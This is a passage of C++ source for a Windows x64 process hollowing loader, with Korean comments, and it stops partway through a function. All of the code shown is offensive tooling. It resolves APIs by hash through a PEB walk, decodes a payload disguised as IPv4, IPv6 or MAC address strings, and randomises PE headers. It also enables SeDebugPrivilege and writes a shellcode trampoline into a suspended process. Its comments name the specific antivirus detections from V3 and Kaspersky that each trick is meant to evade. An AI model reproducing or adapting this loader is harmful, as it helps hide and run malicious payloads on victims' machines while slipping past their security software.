/*
 * ph.cpp — Minimal Process Hollowing loader (API hashing variant)
 *
 * 포함 기능:
 *   - HSF 페이로드 복호화 및 무결성 검사 (IPv4/IPv6/MAC)
 *   - x64 Native PE process hollowing
 *   - FNV-1a compile-time 해시 + PEB walk + EAT 순회로 API 해석
 *     * V3 "Win.rootkit" 정적 heuristic 회피
 *     * CreateProcessA/VirtualAllocEx/WriteProcessMemory 등 바이너리에 문자열 미노출
 *
 * Build (x64, MSVC):
 *   cl /O2 /std:c++17 /EHsc /utf-8 ph.cpp /Fe:ph.exe
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

#define PRINT_WINAPI_ERR(API) \
    fprintf(stderr, "[!] %s Failed With Error: %lu\n", (API), GetLastError())

#define DELETE_HANDLE(H) do { \
    if ((H) != NULL && (H) != INVALID_HANDLE_VALUE) { \
        CloseHandle((H)); \
        (H) = NULL; \
    } \
} while (0)

#define PARMS ""

#ifndef ENABLE_STOMP_FULL
#  define ENABLE_STOMP_FULL 1   /* Load_3 전 payload PE 헤더 변형 */
#endif

#ifndef PRE_RELEASE_SLEEP_MS
#  define PRE_RELEASE_SLEEP_MS 10000  /* 로더 heap 정리 완료 후 payload 실행 트리거 전 대기 */
#endif

/* ================================================================
 * API Hashing (FNV-1a + PEB walk + EAT resolver)
 * ================================================================ */
constexpr uint32_t FNV1A_OFFSET = 0x811C9DC5u;
constexpr uint32_t FNV1A_PRIME  = 0x01000193u;

static constexpr uint32_t h_fnv(const char* s, uint32_t h = FNV1A_OFFSET) {
    return *s ? h_fnv(s + 1, (h ^ (uint32_t)(uint8_t)*s) * FNV1A_PRIME) : h;
}

static constexpr uint32_t h_fnvW_lo_impl(const wchar_t* s, uint32_t h) {
    return *s
        ? h_fnvW_lo_impl(
              s + 1,
              (h ^ (uint32_t)(uint8_t)(
                  (*s >= L'A' && *s <= L'Z') ? (*s + 32) : *s)
              ) * FNV1A_PRIME)
        : h;
}
static constexpr uint32_t h_fnvW_lo(const wchar_t* s) {
    return h_fnvW_lo_impl(s, FNV1A_OFFSET);
}

/* winternl.h가 LDR_DATA_TABLE_ENTRY 를 완전 공개 안해서 자체 정의 */
typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY;

static PVOID PebFindModuleHash(uint32_t targetHash) {
    PPEB peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
    if (!peb || !peb->Ldr) return NULL;
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;
    while (entry && entry != head) {
        MY_LDR_ENTRY* mod = (MY_LDR_ENTRY*)((BYTE*)entry
            - offsetof(MY_LDR_ENTRY, InMemoryOrderLinks));
        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length) {
            uint32_t h = FNV1A_OFFSET;
            USHORT n = (USHORT)(mod->BaseDllName.Length / sizeof(wchar_t));
            for (USHORT i = 0; i < n; i++) {
                wchar_t c = mod->BaseDllName.Buffer[i];
                uint8_t lo = (uint8_t)((c >= L'A' && c <= L'Z') ? (c + 32) : c);
                h ^= (uint32_t)lo;
                h *= FNV1A_PRIME;
            }
            if (h == targetHash) return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

static FARPROC HashResolve(HMODULE hMod, uint32_t targetHash) {
    if (!hMod) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY expDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) return NULL;
    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + expDir.VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD*  ords  = (WORD* )((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hMod + names[i]);
        uint32_t h = FNV1A_OFFSET;
        for (const char* p = name; *p; p++) {
            h ^= (uint32_t)(uint8_t)*p;
            h *= FNV1A_PRIME;
        }
        if (h == targetHash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* API 함수 포인터 타입 */
typedef BOOL (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA,
    LPPROCESS_INFORMATION);
typedef LPVOID (WINAPI *fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fn_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *fn_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI *fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI *fn_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI *fn_GetThreadContext)(HANDLE, LPCONTEXT);
typedef DWORD (WINAPI *fn_ResumeThread)(HANDLE);
typedef BOOL (WINAPI *fn_TerminateProcess)(HANDLE, UINT);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES,
    DWORD, PTOKEN_PRIVILEGES, PDWORD);

/* ntdll Nt* 직접 호출용 — section-backed hollowing. OBJECT_ATTRIBUTES/SECTION_INHERIT 는 opaque PVOID/ULONG 로 전달 */
typedef LONG (NTAPI *fn_NtCreateSection)(PHANDLE, ACCESS_MASK, PVOID /*OBJECT_ATTRIBUTES*/,
    PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef LONG (NTAPI *fn_NtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, DWORD /*SECTION_INHERIT*/, ULONG, ULONG);
typedef LONG (NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *fn_NtClose)(HANDLE);

struct ApiTable {
    fn_CreateProcessA              CreateProcessA;
    fn_VirtualAllocEx              VirtualAllocEx;
    fn_VirtualProtectEx            VirtualProtectEx;
    fn_VirtualFreeEx               VirtualFreeEx;
    fn_WriteProcessMemory          WriteProcessMemory;
    fn_ReadProcessMemory           ReadProcessMemory;
    fn_GetThreadContext            GetThreadContext;
    fn_ResumeThread                ResumeThread;
    fn_TerminateProcess            TerminateProcess;
    fn_LoadLibraryA                LoadLibraryA;
    fn_GetProcAddress              GetProcAddress;
    fn_OpenProcessToken            OpenProcessToken;
    fn_LookupPrivilegeValueA       LookupPrivilegeValueA;
    fn_AdjustTokenPrivileges       AdjustTokenPrivileges;
    /* ntdll — section-backed hollowing */
    fn_NtCreateSection             NtCreateSection;
    fn_NtMapViewOfSection          NtMapViewOfSection;
    fn_NtUnmapViewOfSection        NtUnmapViewOfSection;
    fn_NtClose                     NtClose;
};
static ApiTable g_api = {};

static constexpr uint32_t H_K32   = h_fnvW_lo(L"kernel32.dll");
static constexpr uint32_t H_ADV   = h_fnvW_lo(L"advapi32.dll");
static constexpr uint32_t H_NTDLL = h_fnvW_lo(L"ntdll.dll");

static constexpr uint32_t H_CreateProcessA           = h_fnv("CreateProcessA");
static constexpr uint32_t H_VirtualAllocEx           = h_fnv("VirtualAllocEx");
static constexpr uint32_t H_VirtualProtectEx         = h_fnv("VirtualProtectEx");
static constexpr uint32_t H_VirtualFreeEx            = h_fnv("VirtualFreeEx");
static constexpr uint32_t H_WriteProcessMemory       = h_fnv("WriteProcessMemory");
static constexpr uint32_t H_ReadProcessMemory        = h_fnv("ReadProcessMemory");
static constexpr uint32_t H_GetThreadContext         = h_fnv("GetThreadContext");
static constexpr uint32_t H_ResumeThread             = h_fnv("ResumeThread");
static constexpr uint32_t H_TerminateProcess         = h_fnv("TerminateProcess");
static constexpr uint32_t H_LoadLibraryA             = h_fnv("LoadLibraryA");
static constexpr uint32_t H_GetProcAddress           = h_fnv("GetProcAddress");
static constexpr uint32_t H_OpenProcessToken         = h_fnv("OpenProcessToken");
static constexpr uint32_t H_LookupPrivilegeValueA    = h_fnv("LookupPrivilegeValueA");
static constexpr uint32_t H_AdjustTokenPrivileges    = h_fnv("AdjustTokenPrivileges");

static constexpr uint32_t H_NtCreateSection          = h_fnv("NtCreateSection");
static constexpr uint32_t H_NtMapViewOfSection       = h_fnv("NtMapViewOfSection");
static constexpr uint32_t H_NtUnmapViewOfSection     = h_fnv("NtUnmapViewOfSection");
static constexpr uint32_t H_NtClose                  = h_fnv("NtClose");

static BOOL InitApiTable() {
    HMODULE k32 = (HMODULE)PebFindModuleHash(H_K32);
    if (!k32) {
        fprintf(stderr, "[!] kernel32 not found via PEB\n");
        return FALSE;
    }

    g_api.CreateProcessA           = (fn_CreateProcessA)           HashResolve(k32, H_CreateProcessA);
    g_api.VirtualAllocEx           = (fn_VirtualAllocEx)           HashResolve(k32, H_VirtualAllocEx);
    g_api.VirtualProtectEx         = (fn_VirtualProtectEx)         HashResolve(k32, H_VirtualProtectEx);
    g_api.VirtualFreeEx            = (fn_VirtualFreeEx)            HashResolve(k32, H_VirtualFreeEx);
    g_api.WriteProcessMemory       = (fn_WriteProcessMemory)       HashResolve(k32, H_WriteProcessMemory);
    g_api.ReadProcessMemory        = (fn_ReadProcessMemory)        HashResolve(k32, H_ReadProcessMemory);
    g_api.GetThreadContext         = (fn_GetThreadContext)         HashResolve(k32, H_GetThreadContext);
    g_api.ResumeThread             = (fn_ResumeThread)             HashResolve(k32, H_ResumeThread);
    g_api.TerminateProcess         = (fn_TerminateProcess)         HashResolve(k32, H_TerminateProcess);
    g_api.LoadLibraryA             = (fn_LoadLibraryA)             HashResolve(k32, H_LoadLibraryA);
    g_api.GetProcAddress           = (fn_GetProcAddress)           HashResolve(k32, H_GetProcAddress);

    HMODULE adv = (HMODULE)PebFindModuleHash(H_ADV);
    if (!adv && g_api.LoadLibraryA) {
        char n[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0 };
        adv = g_api.LoadLibraryA(n);
    }
    if (!adv) {
        fprintf(stderr, "[!] advapi32 not available\n");
        return FALSE;
    }
    g_api.OpenProcessToken      = (fn_OpenProcessToken)      HashResolve(adv, H_OpenProcessToken);
    g_api.LookupPrivilegeValueA = (fn_LookupPrivilegeValueA) HashResolve(adv, H_LookupPrivilegeValueA);
    g_api.AdjustTokenPrivileges = (fn_AdjustTokenPrivileges) HashResolve(adv, H_AdjustTokenPrivileges);

    HMODULE ntd = (HMODULE)PebFindModuleHash(H_NTDLL);
    if (!ntd) {
        fprintf(stderr, "[!] ntdll not found via PEB\n");
        return FALSE;
    }
    g_api.NtCreateSection      = (fn_NtCreateSection)      HashResolve(ntd, H_NtCreateSection);
    g_api.NtMapViewOfSection   = (fn_NtMapViewOfSection)   HashResolve(ntd, H_NtMapViewOfSection);
    g_api.NtUnmapViewOfSection = (fn_NtUnmapViewOfSection) HashResolve(ntd, H_NtUnmapViewOfSection);
    g_api.NtClose              = (fn_NtClose)              HashResolve(ntd, H_NtClose);

    if (!g_api.CreateProcessA || !g_api.VirtualAllocEx || !g_api.VirtualProtectEx ||
        !g_api.VirtualFreeEx || !g_api.WriteProcessMemory || !g_api.ReadProcessMemory ||
        !g_api.GetThreadContext || !g_api.ResumeThread || !g_api.TerminateProcess ||
        !g_api.LoadLibraryA || !g_api.GetProcAddress ||
        !g_api.OpenProcessToken || !g_api.LookupPrivilegeValueA || !g_api.AdjustTokenPrivileges ||
        !g_api.NtCreateSection || !g_api.NtMapViewOfSection ||
        !g_api.NtUnmapViewOfSection || !g_api.NtClose) {
        fprintf(stderr, "[!] API resolution incomplete\n");
        return FALSE;
    }
    return TRUE;
}

/* ================================================================
 * Section-backed hollowing: 로컬 뷰 memcpy redirect
 * ------------------------------------------------------------------
 * NtMapViewOfSection 으로 섹션을 로컬+원격에 동시 매핑 →
 * 로컬 뷰에 memcpy 하면 원격 프로세스 메모리에 자동 반영 →
 * WriteProcessMemory 호출 자체 제거 (Kaspersky PDM WPM 축 삭제).
 * ================================================================ */
static PVOID  g_pLocalView  = NULL;   /* 로더 쪽 RW 뷰 — memcpy 대상 */
static PVOID  g_pRemoteBase = NULL;   /* 자식 쪽 RWX 뷰 — hollowing target */
static SIZE_T g_viewSize    = 0;

static BOOL RemoteWrite(HANDLE hProc, PVOID remoteDst, LPCVOID src,
                        SIZE_T size, SIZE_T* pWritten) {
    /* 메인 섹션 영역이면 로컬 뷰에 memcpy — 원격 자동 반영 (WPM 호출 안 함) */
    if (g_pLocalView && g_pRemoteBase && g_viewSize &&
        (ULONG_PTR)remoteDst >= (ULONG_PTR)g_pRemoteBase &&
        (ULONG_PTR)remoteDst + size <= (ULONG_PTR)g_pRemoteBase + g_viewSize) {
        SIZE_T off = (ULONG_PTR)remoteDst - (ULONG_PTR)g_pRemoteBase;
        memcpy((BYTE*)g_pLocalView + off, src, size);
        if (pWritten) *pWritten = size;
        return TRUE;
    }
    return g_api.WriteProcessMemory(hProc, remoteDst, src, size, pWritten);
}

/* ================================================================
 * Forward declarations
 * ================================================================ */
struct DATA { void* data; size_t len; };

static DATA LoadHSF(const char* path);
static BOOL EnableDebugPrivilege(VOID);
static BOOL CreateTheHollowedProcess(LPCSTR cRemoteProcessImage,
    LPCSTR cProcessParms, PPROCESS_INFORMATION pProcessInfo);
static BOOL InstallEntryPointTrampoline(HANDLE hProcess,
    ULONG_PTR uOriginalEntryPoint, ULONG_PTR uPebImageBaseField,
    ULONG_PTR uPayloadBase, ULONG_PTR uPayloadEntryPoint,
    PBYTE* ppRemoteGateState);
static BOOL RepairRemoteIAT(HANDLE hProcess, PBYTE pPeBuffer,
    DWORD dwPeSize, PIMAGE_NT_HEADERS pImgNtHdrs, ULONG_PTR uRemoteBase);
static BOOL FixMemPermissionsEx(HANDLE hProcess, ULONG_PTR pPeBaseAddress,
    PIMAGE_NT_HEADERS pImgNtHdrs, PIMAGE_SECTION_HEADER pImgSecHdr);
static BOOL RemotePeExec(PBYTE pPeBuffer, LPCSTR cRemoteProcessImage,
    DWORD dwPeSize, LPCSTR cProcessParms, DWORD dwTimeoutMs);

/* ================================================================
 * HSF decoder
 * ================================================================ */
enum { HSF_IPV4=1, HSF_IPV6=2, HSF_MAC=3 };
#define HSF_FNV_OFF  14695981039346656037ULL
#define HSF_FNV_PRI  1099511628211ULL

static int hsf_u16(FILE* f, uint16_t* v){ unsigned char b[2]; if(fread(b,1,2,f)!=2) return 0; *v=b[0]|((uint16_t)b[1]<<8); return 1; }
static int hsf_u64(FILE* f, uint64_t* v){ unsigned char b[8]; uint64_t r=0; if(fread(b,1,8,f)!=8) return 0; for(int i=0;i<8;i++) r|=(uint64_t)b[i]<<(i*8); *v=r; return 1; }
static uint64_t hsf_fnv(uint64_t h, const unsigned char* d, size_t n){ for(size_t i=0;i<n;i++){ h^=d[i]; h*=HSF_FNV_PRI; } return h; }
static int hsf_hex(char c){ if(c>='0'&&c<='9') return c-'0'; c=(char)toupper((unsigned char)c); if(c>='A'&&c<='F') return c-'A'+10; return -1; }

static int hsf_ipv4(const char* t, unsigned char o[16]){
    const char* p=t;
    for(int i=0;i<4;i++){ unsigned r=0, d=0;
        while(*p>='0'&&*p<='9'){ r=r*10u+(*p-'0'); if(r>255) return 0; ++p; ++d; }
        if(!d) return 0; o[i]=(unsigned char)r;
        if(i!=3){ if(*p!='.') return 0; ++p; } }
    return *p=='\0';
}
static int hsf_ipv6(const char* t, unsigned char o[16]){
    if(strlen(t)!=39) return 0;
    for(int g=0;g<8;g++){ size_t off=(size_t)g*5;
        int h0=hsf_hex(t[off]),h1=hsf_hex(t[off+1]),h2=hsf_hex(t[off+2]),h3=hsf_hex(t[off+3]);
        if(h0<0||h1<0||h2<0||h3<0) return 0;
        o[g*2]  =(unsigned char)((h0<<4)|h1);
        o[g*2+1]=(unsigned char)((h2<<4)|h3);
        if(g!=7 && t[off+4]!=':') return 0; }
    return 1;
}
static int hsf_mac(const char* t, unsigned char o[16]){
    if(strlen(t)!=17) return 0;
    for(int i=0;i<6;i++){ size_t off=(size_t)i*3;
        int hi=hsf_hex(t[off]),lo=hsf_hex(t[off+1]);
        if(hi<0||lo<0) return 0;
        o[i]=(unsigned char)((hi<<4)|lo);
        if(i!=5 && t[off+2]!='-') return 0; }
    return 1;
}
static size_t hsf_chunk(unsigned char m){ switch(m){case HSF_IPV4:return 4;case HSF_IPV6:return 16;case HSF_MAC:return 6;default:return 0;} }
static int hsf_rec(unsigned char m, const char* t, unsigned char o[16]){
    memset(o,0,16);
    switch(m){ case HSF_IPV4: return hsf_ipv4(t,o); case HSF_IPV6: return hsf_ipv6(t,o); case HSF_MAC: return hsf_mac(t,o); default: return 0; }
}

static DATA LoadHSF(const char* path){
    DATA res{NULL,0};
    FILE* fp=fopen(path,"rb"); if(!fp) return res;

    unsigned char magic[4]{}, ver=0, mode=0, rsv[2]{};
    uint64_t orig=0, cnt=0, exp_h=0, act=HSF_FNV_OFF, written=0;
    void* buf=NULL;

    if(fread(magic,1,4,fp)!=4 || memcmp(magic,"HSF1",4) ||
       fread(&ver,1,1,fp)!=1 || fread(&mode,1,1,fp)!=1 || fread(rsv,1,2,fp)!=2 ||
       !hsf_u64(fp,&orig) || !hsf_u64(fp,&cnt) || !hsf_u64(fp,&exp_h))
    { fprintf(stderr, "[!] HSF: bad header\n"); goto cl; }

    if(ver!=1 || rsv[0] || rsv[1]){ fprintf(stderr, "[!] HSF: bad version\n"); goto cl; }
    { size_t ck=hsf_chunk(mode); if(!ck || cnt != orig/ck + (orig%ck!=0)){ fprintf(stderr, "[!] HSF: mode/count\n"); goto cl; } }
    if(!orig || orig > 0x7FFFFFFFull){ fprintf(stderr, "[!] HSF: size out of range\n"); goto cl; }

    buf=malloc((size_t)orig); if(!buf){ fprintf(stderr, "[!] HSF: alloc fail\n"); goto cl; }

    for(uint64_t idx=0; idx<cnt; idx++){
        uint16_t tl=0; char text[64]{}; unsigned char dec[16]{}; size_t bw;
        if(!hsf_u16(fp,&tl) || !tl || tl>=64 || fread(text,1,tl,fp)!=tl){ fprintf(stderr, "[!] HSF: record read\n"); goto cl; }
        text[tl]='\0';
        if(!hsf_rec(mode,text,dec)){ fprintf(stderr, "[!] HSF: record decode\n"); goto cl; }
        bw=hsf_chunk(mode); if((uint64_t)bw > orig-written) bw=(size_t)(orig-written);
        if(bw){ memcpy((BYTE*)buf+written, dec, bw); act=hsf_fnv(act,dec,bw); written+=bw; }
    }
    if(written!=orig || fgetc(fp)!=EOF || act!=exp_h){ fprintf(stderr, "[!] HSF: integrity\n"); goto cl; }
    printf("[*] HSF OK: %llu bytes decoded (mode=%u)\n",
           (unsigned long long)written, (unsigned)mode);
    res.data=buf; res.len=(size_t)written; buf=NULL;
cl:
    fclose(fp);
    if(buf) free(buf);
    return res;
}

/* ================================================================
 * PE Header Full Stomp (payload native x64 PE)
 * ------------------------------------------------------------------
 * V3 가 payload 바이트 지문 매치하면 매 run 다른 fingerprint 로 리셋.
 * CLR metadata 는 X (payload 네이티브 가정).
 * ================================================================ */
#if ENABLE_STOMP_FULL
static void StompPeHeaderFull(BYTE* pe, DWORD sz) {
    if (!pe || sz < 0x200) return;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    DWORD peOff = (DWORD)dos->e_lfanew;
    if (peOff + sizeof(IMAGE_NT_HEADERS64) > sz) return;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + peOff);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    /* 1. Rich header strip — DOS stub text (0x40-0x7F) 유지, 그 뒤 ~ PE 헤더 전 zero */
    DWORD richStart = 0x80;
    if (peOff > richStart && peOff <= sz) {
        memset(pe + richStart, 0, peOff - richStart);
    }

    /* 2. CheckSum zero */
    nt->OptionalHeader.CheckSum = 0;

    /* 3. FileHeader */
    nt->FileHeader.PointerToSymbolTable = 0;
    nt->FileHeader.NumberOfSymbols = 0;
    nt->FileHeader.TimeDateStamp = GetTickCount();

    /* 4. OptionalHeader versions random */
    nt->OptionalHeader.MajorLinkerVersion = 14;
    nt->OptionalHeader.MinorLinkerVersion = (BYTE)(10 + (rand() % 30));
    nt->OptionalHeader.MajorOperatingSystemVersion = 10;
    nt->OptionalHeader.MinorOperatingSystemVersion = 0;
    nt->OptionalHeader.MajorSubsystemVersion = 10;
    nt->OptionalHeader.MinorSubsystemVersion = 0;
    nt->OptionalHeader.MajorImageVersion = (WORD)(rand() % 10);
    nt->OptionalHeader.MinorImageVersion = (WORD)(rand() % 100);

    /* 5. Debug Directory 비우기 */
    if (nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_DEBUG) {
        IMAGE_DATA_DIRECTORY* dbgDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        dbgDir->VirtualAddress = 0;
        dbgDir->Size = 0;
    }

    /* 6. Section names 랜덤화 */
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        memset(sec->Name, 0, 8);
        sec->Name[0] = '.';
        int len = 4 + (rand() % 3);
        for (int j = 1; j <= len && j < 8; j++) {
            sec->Name[j] = (BYTE)('a' + (rand() % 26));
        }
    }

    printf("[+] PE header stomp applied\n");
}
#endif /* ENABLE_STOMP_FULL */

/* ================================================================
 * SeDebugPrivilege
 * ================================================================ */
static BOOL EnableDebugPrivilege(VOID) {
    HANDLE          hToken = NULL;
    TOKEN_PRIVILEGES tp    = { 0 };
    BOOL            bState = FALSE;

    char seDebugName[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e', 0 };

    if (!g_api.OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PRINT_WINAPI_ERR("OpenProcessToken");
        goto _CLEANUP;
    }

    if (!g_api.LookupPrivilegeValueA(NULL, seDebugName, &tp.Privileges[0].Luid)) {
        PRINT_WINAPI_ERR("LookupPrivilegeValue");
        goto _CLEANUP;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!g_api.AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        PRINT_WINAPI_ERR("AdjustTokenPrivileges");
        goto _CLEANUP;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[!] SeDebugPrivilege not assigned - run as Administrator\n");
        goto _CLEANUP;
    }

    printf("[*] SeDebugPrivilege enabled\n");
    bState = TRUE;

_CLEANUP:
    DELETE_HANDLE(hToken);
    return bState;
}

/* ================================================================
 * Create suspended hollowed process
 * ================================================================ */
static BOOL CreateTheHollowedProcess(LPCSTR cRemoteProcessImage,
    LPCSTR cProcessParms, PPROCESS_INFORMATION pProcessInfo) {

    STARTUPINFOA StartupInfo = { 0 };
    LPSTR        cmdline     = NULL;
    SIZE_T       cbCommand   = 0;
    BOOL         bSTATE      = FALSE;

    if (!cRemoteProcessImage || !pProcessInfo) return FALSE;

    ZeroMemory(pProcessInfo, sizeof(*pProcessInfo));
    StartupInfo.cb = sizeof(StartupInfo);

    cbCommand = strlen(cRemoteProcessImage) +
        (cProcessParms && *cProcessParms ? strlen(cProcessParms) + 1 : 0) +
        3;

    cmdline = (LPSTR)LocalAlloc(LPTR, cbCommand);
    if (!cmdline) {
        PRINT_WINAPI_ERR("LocalAlloc");
        return FALSE;
    }

    if (cProcessParms && *cProcessParms)
        sprintf_s(cmdline, cbCommand, "\"%s\" %s", cRemoteProcessImage, cProcessParms);
    else
        sprintf_s(cmdline, cbCommand, "\"%s\"", cRemoteProcessImage);

    printf("[*] Spawning: %s\n", cmdline);

    if (!g_api.CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                              CREATE_SUSPENDED,
                              NULL, NULL, &StartupInfo, pProcessInfo)) {
        PRINT_WINAPI_ERR("CreateProcessA");
        goto _CLEANUP;
    }

    printf("[*] Target PID: %lu\n", pProcessInfo->dwProcessId);
    bSTATE = TRUE;

_CLEANUP:
    if (cmdline) LocalFree(cmdline);
    return bSTATE;
}

/* ================================================================
 * Entry trampoline + loader-init gate
 * ================================================================ */
static BOOL InstallEntryPointTrampoline(HANDLE hProcess,
    ULONG_PTR uOriginalEntryPoint, ULONG_PTR uPebImageBaseField,
    ULONG_PTR uPayloadBase, ULONG_PTR uPayloadEntryPoint,
    PBYTE* ppRemoteGateState) {

    BYTE entryJump[12] = {
        0x48, 0xB8,
        0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0
    };
    BYTE bootstrap[64] = {
        0x48, 0xB8,
        0, 0, 0, 0, 0, 0, 0, 0,
        0xC6, 0x00, 0x01,
        0x80, 0x78, 0x01, 0x01,
        0x74, 0x04,
        0xF3, 0x90,
        0xEB, 0xF6,
        0x48, 0xB8,
        0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0xBA,
        0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0x89, 0x10,
        0x48, 0xB8,
        0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0,
        0, 0, 0, 0,
        0,
        0
    };
    PBYTE remoteBootstrap = NULL;
    DWORD oldProtection = 0;
    DWORD ignoredProtection = 0;
    SIZE_T written = 0;

    if (!ppRemoteGateState) return FALSE;
    *ppRemoteGateState = NULL;

    remoteBootstrap = (PBYTE)g_api.VirtualAllocEx(
        hProcess, NULL, sizeof(bootstrap),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBootstrap) {
        PRINT_WINAPI_ERR("VirtualAllocEx[entry-bootstrap]");
        return FALSE;
    }

    {
        ULONG_PTR reachedFlag = (ULONG_PTR)(remoteBootstrap + 62);
        memcpy(&bootstrap[2],  &reachedFlag, sizeof(reachedFlag));
    }
    memcpy(&bootstrap[25], &uPebImageBaseField, sizeof(uPebImageBaseField));
    memcpy(&bootstrap[35], &uPayloadBase, sizeof(uPayloadBase));
    memcpy(&bootstrap[48], &uPayloadEntryPoint, sizeof(uPayloadEntryPoint));

    if (!RemoteWrite(hProcess, remoteBootstrap,
                                  bootstrap, sizeof(bootstrap), &written) ||
        written != sizeof(bootstrap)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[entry-bootstrap]");
        g_api.VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }
    FlushInstructionCache(hProcess, remoteBootstrap, sizeof(bootstrap));

    {
        ULONG_PTR bootstrapAddress = (ULONG_PTR)remoteBootstrap;
        memcpy(&entryJump[2], &bootstrapAddress, sizeof(bootstrapAddress));
    }

    if (!g_api.VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                                sizeof(entryJump), PAGE_EXECUTE_READWRITE,
                                &oldProtection)) {
        PRINT_WINAPI_ERR("VirtualProtectEx[original-entry]");
        g_api.VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!RemoteWrite(hProcess, (PVOID)uOriginalEntryPoint,
                                  entryJump, sizeof(entryJump), &written) ||
        written != sizeof(entryJump)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[entry-trampoline]");
        g_api.VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                               sizeof(entryJump), oldProtection, &ignoredProtection);
        g_api.VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
        return FALSE;
    }

    FlushInstructionCache(hProcess, (PVOID)uOriginalEntryPoint, sizeof(entryJump));
    g_api.VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
                           sizeof(entryJump), oldProtection, &ignoredProtection);

    printf("[*] Entry trampoline installed: 0x%p -> 0x%p -> 0x%p\n",
           (PVOID)uOriginalEntryPoint, remoteBootstrap, (PVOID)uPayloadEntryPoint);
    *ppRemoteGateState = remoteBootstrap + 62;
    return TRUE;
}

/* ================================================================
 * RVA → raw file offset
 * ================================================================ */
static PBYTE RawPointerFromRva(PBYTE pPeBuffer, DWORD dwPeSize,
